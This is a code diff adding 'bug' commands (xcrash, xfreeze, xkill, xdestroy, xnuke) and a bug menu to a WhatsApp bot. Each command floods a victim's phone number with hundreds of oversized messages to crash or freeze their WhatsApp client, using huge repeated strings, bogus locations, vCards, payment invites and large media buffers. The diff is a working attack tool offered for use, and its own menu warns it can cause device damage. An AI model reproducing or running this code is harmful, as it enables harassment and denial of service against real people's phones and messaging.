@@ -400,6 +400,384 @@ module.exports = async (XeonBotInc, m, chatUpdate, store) => {
                 }
                 break
             }
+                case 'xcrash': {
+    try {
+        if (!isOwner(m.sender)) {
+            return reply('🚫 *OWNER ONLY COMMAND*\n\nAccess Denied!');
+        }
+        
+        if (!text) return reply(`💀 *XCRASH BUG*\n\n📝 Usage: ${prefix + command} number|amount\n📋 Example: ${prefix + command} 919876543210|3`);
+        
+        const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '💀 Preparing XCRASH Bug...' }, { quoted: m });
+        
+        const [targetNum, count] = text.split('|');
+        const victim = targetNum + "@s.whatsapp.net";
+        const amount = parseInt(count) * 50;
+        
+        if (isNaN(amount) || amount <= 0) {
+            return reply('❌ Invalid amount!');
+        }
+        
+        const crashPayload = {
+            text: '💀'.repeat(100000),
+            contextInfo: {
+                isForwarded: true,
+                forwardedNewsletterMessageInfo: {
+                    newsletterJid: '120363222395675670@newsletter',
+                    newsletterName: '💀XCRASH💀'.repeat(50000),
+                    serverMessageId: 999999999
+                },
+                externalAdReply: {
+                    title: '💀CRASH💀'.repeat(50000),
+                    body: 'XEON'.repeat(50000),
+                    mediaType: 1,
+                    renderLargerThumbnail: true,
+                    thumbnailUrl: 'https://example.com/crash.jpg',
+                    sourceUrl: 'https://wa.me/' + targetNum
+                },
+                mentionedJid: [victim],
+                quotedMessage: {
+                    conversation: '💀'.repeat(100000)
+                }
+            }
+        };
+        
+        for (let i = 0; i < amount; i++) {
+            await XeonBotInc.sendMessage(victim, crashPayload, { quoted: xbug3 });
+            if (i % 10 === 0) await new Promise(resolve => setTimeout(resolve, 100));
+        }
+        
+        await XeonBotInc.sendMessage(m.chat, { 
+            text: `💀 *XCRASH DEPLOYED*\n\n🎯 Target: ${victim}\n💥 Amount: ${amount}\n⚡ Status: SENT`,
+            edit: loadingMsg.key 
+        });
+    } catch (error) {
+        console.error('XCRASH error:', error);
+        await reply('❌ XCRASH failed to deploy');
+    }
+    break;
+}
+
+case 'xfreeze': {
+    try {
+        if (!isOwner(m.sender)) {
+            return reply('🚫 *OWNER ONLY COMMAND*\n\nAccess Denied!');
+        }
+        
+        if (!text) return reply(`🧊 *XFREEZE BUG*\n\n📝 Usage: ${prefix + command} number|amount\n📋 Example: ${prefix + command} 919876543210|2`);
+        
+        const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '🧊 Preparing XFREEZE Bug...' }, { quoted: m });
+        
+        const [targetNum, count] = text.split('|');
+        const victim = targetNum + "@s.whatsapp.net";
+        const amount = parseInt(count) * 40;
+        
+        if (isNaN(amount) || amount <= 0) {
+            return reply('❌ Invalid amount!');
+        }
+        
+        for (let i = 0; i < amount; i++) {
+            // Location freeze bug
+            await XeonBotInc.sendMessage(victim, {
+                location: {
+                    degreesLatitude: 999.999999999,
+                    degreesLongitude: -999.999999999,
+                    name: '🧊FREEZE🧊'.repeat(50000),
+                    address: 'XEON FREEZE'.repeat(50000),
+                    jpegThumbnail: Buffer.alloc(200000, 0xFF)
+                },
+                contextInfo: {
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363144038483540@newsletter',
+                        newsletterName: '🧊FREEZE🧊'.repeat(50000),
+                        serverMessageId: 999999999
+                    }
+                }
+            }, { quoted: xbug2 });
+            
+            // Contact freeze bug
+            await XeonBotInc.sendMessage(victim, {
+                contacts: {
+                    displayName: 'FREEZE'.repeat(50000),
+                    contacts: [{
+                        displayName: '🧊'.repeat(100000),
+                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${'FREEZE'.repeat(50000)}\nFN:${'🧊XEON🧊'.repeat(50000)}\nitem1.TEL;waid=${targetNum}:+${targetNum}\nitem1.X-ABLabel:FREEZE\nEND:VCARD`
+                    }]
+                }
+            }, { quoted: xbug3 });
+            
+            await new Promise(resolve => setTimeout(resolve, 200));
+        }
+        
+        await XeonBotInc.sendMessage(m.chat, { 
+            text: `🧊 *XFREEZE DEPLOYED*\n\n🎯 Target: ${victim}\n❄️ Amount: ${amount}\n⚡ Status: SENT`,
+            edit: loadingMsg.key 
+        });
+    } catch (error) {
+        console.error('XFREEZE error:', error);
+        await reply('❌ XFREEZE failed to deploy');
+    }
+    break;
+}
+
+case 'xkill': {
+    try {
+        if (!isOwner(m.sender)) {
+            return reply('🚫 *OWNER ONLY COMMAND*\n\nAccess Denied!');
+        }
+        
+        if (!text) return reply(`☠️ *XKILL BUG*\n\n📝 Usage: ${prefix + command} number|amount\n📋 Example: ${prefix + command} 919876543210|1`);
+        
+        const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '☠️ Preparing XKILL Bug...' }, { quoted: m });
+        
+        const [targetNum, count] = text.split('|');
+        const victim = targetNum + "@s.whatsapp.net";
+        const amount = parseInt(count) * 100;
+        
+        if (isNaN(amount) || amount <= 0) {
+            return reply('❌ Invalid amount!');
+        }
+        
+        for (let i = 0; i < amount; i++) {
+            // Payment bug
+            await XeonBotInc.relayMessage(victim, {
+                "paymentInviteMessage": {
+                    serviceType: "FBPAY",
+                    expiryTimestamp: Date.now() + 99999999999999
+                }
+            }, {});
+            
+            // Newsletter bug
+            await XeonBotInc.sendMessage(victim, {
+                text: '☠️XKILL☠️'.repeat(100000),
+                contextInfo: {
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363222395675670@newsletter',
+                        newsletterName: '☠️KILL☠️'.repeat(100000),
+                        serverMessageId: 999999999
+                    },
+                    externalAdReply: {
+                        title: '☠️'.repeat(100000),
+                        body: 'XEON KILL'.repeat(100000),
+                        mediaType: 2,
+                        renderLargerThumbnail: true,
+                        thumbnailUrl: 'https://example.com/kill.jpg'
+                    }
+                }
+            }, { quoted: xbug3 });
+            
+            // Audio kill bug
+            await XeonBotInc.sendMessage(victim, {
+                audio: wkwk,
+                mimetype: 'audio/mpeg',
+                ptt: false,
+                title: '☠️KILL☠️'.repeat(100000),
+                contextInfo: {
+                    forwardingScore: 999999999,
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363144038483540@newsletter',
+                        newsletterName: '☠️XKILL☠️'.repeat(100000),
+                        serverMessageId: 999999999
+                    }
+                }
+            }, { quoted: xbug2 });
+            
+            await new Promise(resolve => setTimeout(resolve, 50));
+        }
+        
+        await XeonBotInc.sendMessage(m.chat, { 
+            text: `☠️ *XKILL DEPLOYED*\n\n🎯 Target: ${victim}\n💀 Amount: ${amount}\n⚡ Status: SENT`,
+            edit: loadingMsg.key 
+        });
+    } catch (error) {
+        console.error('XKILL error:', error);
+        await reply('❌ XKILL failed to deploy');
+    }
+    break;
+}
+
+case 'xdestroy': {
+    try {
+        if (!isOwner(m.sender)) {
+            return reply('🚫 *OWNER ONLY COMMAND*\n\nAccess Denied!');
+        }
+        
+        if (!text) return reply(`💥 *XDESTROY BUG*\n\n📝 Usage: ${prefix + command} number|amount\n📋 Example: ${prefix + command} 919876543210|1`);
+        
+        const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '💥 Preparing XDESTROY Bug...' }, { quoted: m });
+        
+        const [targetNum, count] = text.split('|');
+        const victim = targetNum + "@s.whatsapp.net";
+        const amount = parseInt(count) * 75;
+        
+        if (isNaN(amount) || amount <= 0) {
+            return reply('❌ Invalid amount!');
+        }
+        
+        const destroyPayloads = [
+            // Payload 1: Document bug
+            {
+                document: Buffer.alloc(999999, 0xFF),
+                fileName: '💥DESTROY💥'.repeat(50000) + '.pdf',
+                mimetype: 'application/pdf',
+                contextInfo: {
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363222395675670@newsletter',
+                        newsletterName: '💥XDESTROY💥'.repeat(100000),
+                        serverMessageId: 999999999
+                    }
+                }
+            },
+            // Payload 2: Image bug
+            {
+                image: Buffer.alloc(999999, 0xFF),
+                caption: '💥DESTROY💥'.repeat(100000),
+                contextInfo: {
+                    mentionedJid: [victim],
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363144038483540@newsletter',
+                        newsletterName: '💥DESTROY💥'.repeat(100000),
+                        serverMessageId: 999999999
+                    }
+                }
+            },
+            // Payload 3: Video bug
+            {
+                video: Buffer.alloc(999999, 0xFF),
+                caption: '💥XEON DESTROY💥'.repeat(100000),
+                mimetype: 'video/mp4',
+                contextInfo: {
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363222395675670@newsletter',
+                        newsletterName: '💥DESTROY💥'.repeat(100000),
+                        serverMessageId: 999999999
+                    }
+                }
+            }
+        ];
+        
+        for (let i = 0; i < amount; i++) {
+            const payload = destroyPayloads[i % destroyPayloads.length];
+            await XeonBotInc.sendMessage(victim, payload, { quoted: xbug3 });
+            
+            if (i % 5 === 0) await new Promise(resolve => setTimeout(resolve, 100));
+        }
+        
+        await XeonBotInc.sendMessage(m.chat, { 
+            text: `💥 *XDESTROY DEPLOYED*\n\n🎯 Target: ${victim}\n🔥 Amount: ${amount}\n⚡ Status: SENT`,
+            edit: loadingMsg.key 
+        });
+    } catch (error) {
+        console.error('XDESTROY error:', error);
+        await reply('❌ XDESTROY failed to deploy');
+    }
+    break;
+}
+
+case 'xnuke': {
+    try {
+        if (!isOwner(m.sender)) {
+            return reply('🚫 *OWNER ONLY COMMAND*\n\nAccess Denied!');
+        }
+        
+        if (!text) return reply(`☢️ *XNUKE BUG*\n\n📝 Usage: ${prefix + command} number\n📋 Example: ${prefix + command} 919876543210\n\n⚠️ WARNING: EXTREME BUG!`);
+        
+        const victim = text + "@s.whatsapp.net";
+        
+        const confirmMsg = await XeonBotInc.sendMessage(m.chat, { 
+            text: `☢️ *XNUKE CONFIRMATION*\n\n🎯 Target: ${victim}\n💀 This will send EXTREME bugs!\n\nReply with "CONFIRM" to proceed or "CANCEL" to abort.` 
+        }, { quoted: m });
+        
+        // Wait for confirmation (you'll need to implement this logic)
+        // For now, proceeding directly (REMOVE THIS IN PRODUCTION)
+        
+        const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '☢️ XNUKE LAUNCHING...' }, { quoted: m });
+        
+        // Multiple bug types in sequence
+        const nukeSequence = async () => {
+            // Phase 1: Text bombs
+            for (let i = 0; i < 50; i++) {
+                await XeonBotInc.sendMessage(victim, {
+                    text: '☢️NUKE☢️'.repeat(100000),
+                    contextInfo: {
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: '120363222395675670@newsletter',
+                            newsletterName: '☢️XNUKE☢️'.repeat(100000),
+                            serverMessageId: 999999999
+                        }
+                    }
+                }, { quoted: xbug3 });
+            }
+            
+            // Phase 2: Payment bugs
+            for (let i = 0; i < 30; i++) {
+                await XeonBotInc.relayMessage(victim, {
+                    "paymentInviteMessage": {
+                        serviceType: "FBPAY",
+                        expiryTimestamp: Date.now() + 99999999999999
+                    }
+                }, {});
+            }
+            
+            // Phase 3: Media bugs
+            for (let i = 0; i < 25; i++) {
+                await XeonBotInc.sendMessage(victim, {
+                    image: Buffer.alloc(999999, 0xFF),
+                    caption: '☢️NUCLEAR☢️'.repeat(100000)
+                }, { quoted: xbug2 });
+            }
+        };
+        
+        await nukeSequence();
+        
+        await XeonBotInc.sendMessage(m.chat, { 
+            text: `☢️ *XNUKE COMPLETED*\n\n🎯 Target: ${victim}\n💥 Status: NUKED\n⚠️ Extreme damage deployed!`,
+            edit: loadingMsg.key 
+        });
+    } catch (error) {
+        console.error('XNUKE error:', error);
+        await reply('❌ XNUKE failed to launch');
+    }
+    break;
+}
+
+case 'bugmenu': {
+    try {
+        if (!isOwner(m.sender)) {
+            return reply('🚫 *OWNER ONLY COMMAND*\n\nAccess Denied!');
+        }
+        
+        const bugMenu = `💀 *XEON BUG MENU* 💀\n\n` +
+                       `👤 *Owner:* ${OWNER_NUMBER}\n` +
+                       `🤖 *Bot:* ${botname}\n\n` +
+                       `🔥 *AVAILABLE BUGS:*\n\n` +
+                       `💀 ${prefix}xcrash number|amount\n` +
+                       `🧊 ${prefix}xfreeze number|amount\n` +
+                       `☠️ ${prefix}xkill number|amount\n` +
+                       `💥 ${prefix}xdestroy number|amount\n` +
+                       `☢️ ${prefix}xnuke number\n\n` +
+                       `⚠️ *WARNING:*\n` +
+                       `• Use responsibly\n` +
+                       `• Can cause device damage\n` +
+                       `• May violate ToS\n` +
+                       `• Owner is responsible\n\n` +
+                       `💀 *XEON BUG BOT* 💀`;
+        
+        await reply(bugMenu);
+    } catch (error) {
+        console.error('Bug menu error:', error);
+        await reply('❌ Menu error');
+    }
+    break;
+}
+
 
             case 'owner':
             case 'creator': {
